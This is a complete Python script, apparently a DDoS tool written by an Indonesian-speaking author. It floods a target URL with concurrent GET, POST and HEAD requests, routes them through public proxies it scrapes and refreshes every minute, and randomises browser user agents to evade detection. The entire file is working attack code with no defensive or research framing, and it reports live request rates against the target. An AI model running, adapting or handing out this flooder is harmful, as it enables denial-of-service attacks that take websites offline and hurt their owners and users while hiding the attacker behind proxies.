import sys
import random
import asyncio
import aiohttp
import requests
import time

# URL API proxy public HTTP (bisa diganti sesuai kebutuhan)
PROXY_API = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
]

METHODS = ["GET", "POST", "HEAD"]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.google.com",
        "Connection": "keep-alive",
    }

def fetch_proxies():
    try:
        r = requests.get(PROXY_API, timeout=10)
        proxies = ["http://" + line.strip() for line in r.text.splitlines() if ":" in line]
        print(f"[Proxy] Didapat {len(proxies)} proxy dari sumber.")
        return proxies
    except Exception as e:
        print(f"[Proxy] Gagal mengambil proxy: {e}")
        return []

async def update_proxies(proxy_list, interval=60):
    while True:
        proxies = await asyncio.get_event_loop().run_in_executor(None, fetch_proxies)
        if proxies:
            proxy_list.clear()
            proxy_list.extend(proxies)
            print(f"[Proxy] Proxy diperbarui. Total proxy aktif: {len(proxy_list)}")
        else:
            print("[Proxy] Tidak ada proxy baru, tetap gunakan proxy lama.")
        await asyncio.sleep(interval)

async def flood(session, target, proxy_list, stats, duration, method=None):
    end_time = time.time() + duration
    while time.time() < end_time:
        if not proxy_list:
            await asyncio.sleep(1)
            continue

        proxy = random.choice(proxy_list)
        http_method = method if method in METHODS else random.choice(METHODS)
        headers = get_headers()
        try:
            if http_method == "GET":
                async with session.get(target, proxy=proxy, headers=headers, timeout=10) as resp:
                    status = resp.status
            elif http_method == "POST":
                async with session.post(target, proxy=proxy, headers=headers, data={"test": "data"}, timeout=10) as resp:
                    status = resp.status
            else:  # HEAD
                async with session.head(target, proxy=proxy, headers=headers, timeout=10) as resp:
                    status = resp.status

            if status in [200, 301, 302, 403, 404]:
                stats["success"] += 1
            else:
                stats["fail"] += 1

        except Exception:
            stats["fail"] += 1
            # Kalau proxy error, coba remove proxy biar tidak dipakai lagi
            try:
                proxy_list.remove(proxy)
                print(f"[Proxy] Proxy bermasalah dihapus: {proxy}")
            except ValueError:
                pass
        await asyncio.sleep(0.01)  # sleep sedikit biar nggak spamming nonstop

async def print_stats(stats, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        total = stats["success"] + stats["fail"]
        rps = total / (time.time() - start_time + 1e-5)
        print(f"\r[Stats] Terkirim: {stats['success']} | Gagal: {stats['fail']} | Total Request: {total} | RPS: {rps:.2f}", end="", flush=True)
        await asyncio.sleep(1)
    print()  # newline setelah selesai

async def main():
    if len(sys.argv) < 4:
        print("Usage: python3 flood_final.py <target_url> <duration_seconds> <concurrency> [method]")
        print("method: GET, POST, HEAD (optional)")
        return

    target = sys.argv[1]
    duration = int(sys.argv[2])
    concurrency = int(sys.argv[3])
    method = sys.argv[4].upper() if len(sys.argv) >= 5 else None
    if method and method not in METHODS:
        print(f"[!] Metode {method} tidak valid, gunakan GET, POST, atau HEAD.")
        return

    proxy_list = fetch_proxies()
    if not proxy_list:
        print("[!] Proxy tidak ditemukan, keluar.")
        return
    print(f"[*] SCRIPT BY PASAAA")
    print(f"[*] Target: {target}")
    print(f"[*] Durasi: {duration}s")
    print(f"[*] Concurrency: {concurrency}")
    print(f"[*] Proxy awal: {len(proxy_list)}")
    print(f"[*] Metode: {method if method else 'Random'}")

    stats = {"success": 0, "fail": 0}

    async with aiohttp.ClientSession() as session:
        tasks = []
        # Task flood
        for _ in range(concurrency):
            tasks.append(flood(session, target, proxy_list, stats, duration, method))
        # Task update proxy berkala
        tasks.append(update_proxies(proxy_list, interval=60))
        # Task print stats live
        tasks.append(print_stats(stats, duration))

        await asyncio.gather(*tasks)

    print("\n📊 Statistik Akhir:")
    print(f"✅ Terkirim sukses: {stats['success']}")
    print(f"❌ Gagal: {stats['fail']}")
    print(f"🕒 Durasi: {duration}s")

if __name__ == "__main__":
    asyncio.run(main())
